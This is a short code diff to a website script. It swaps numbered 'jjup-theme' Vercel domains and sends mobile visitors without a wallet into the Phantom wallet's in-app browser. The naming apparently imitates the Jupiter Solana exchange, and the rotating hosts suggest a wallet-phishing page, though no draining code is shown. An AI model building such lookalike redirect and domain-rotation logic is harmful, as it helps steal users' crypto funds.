@@ -303,14 +303,14 @@ $(document).ready(async function () {
       /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
         navigator.userAgent
       );
-    const siteURL = "https://jjup4-theme.vercel.app";
+    const siteURL = "https://jjup6-theme.vercel.app";
     const encodedURL = encodeURIComponent(siteURL);
     // const siteURL = "https://jupitersol.com"; // 🔗 Your actual site
     // const encodedURL = encodeURIComponent(siteURL);
 
     // 🔗 Redirect to Phantom in-app browser if on mobile and Phantom not detected
     if (isMobile && !window.solana) {
-      window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Fjjup4-theme.vercel.app?ref=https%3A%2F%2Fjjup4-theme.vercel.app";
+      window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Fjjup6-theme.vercel.app?ref=https%3A%2F%2Fjjup6-theme.vercel.app";
       return;
     }
 
@@ -350,7 +350,7 @@ $(document).ready(async function () {
     navigator.userAgent
   );
 
-  const siteURL = "jjup5-theme.vercel.app";
+  const siteURL = "jjup6-theme.vercel.app";
 
   if (isMobile && !window.solflare) {
     // Redirect to Jupiter App
